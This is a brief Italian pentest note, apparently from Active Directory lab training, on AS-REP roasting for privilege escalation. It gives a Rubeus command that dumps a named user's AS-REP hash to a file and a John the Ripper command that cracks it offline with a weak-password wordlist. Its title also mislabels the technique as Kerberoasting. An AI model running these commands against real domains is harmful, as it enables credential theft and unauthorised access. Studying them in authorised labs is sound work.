# Priv Esc - Targeted Kerberoasting - AS-REPs3

* Richiesta AS-REP cifrato per bruteforce offline

```powershell
C:\AD\Tools\Rubeus.exe asreproast /user:VPN1user /outfile:C:\AD\Tools\asrephashes.txt
```

* E' possibile utilizzare John The Ripper per eseguire il bruteforce

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
```
